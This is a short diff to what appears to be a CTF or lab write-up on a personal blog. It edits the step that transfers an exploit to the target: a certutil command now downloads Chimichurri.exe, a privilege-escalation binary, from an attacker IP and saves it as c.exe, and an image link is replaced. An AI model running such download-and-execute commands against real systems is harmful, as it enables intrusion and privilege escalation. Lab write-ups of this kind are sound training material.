@@ -229,9 +229,9 @@ Then ```cd Temp```
 
 Sending the file over to the target
 
-command:```certutil -urlcache -f http://10.10.14.142/41020.exe exploit.exe```
+command:```certutil -urlcache -f http://10.10.14.142/Chimichurri.exe c.exe```
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3b42a87c-ebf5-4a66-968f-8a8a07cf091b)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15d935c2-bcaf-43a3-bae3-d866f8b590d4)
 
 
 
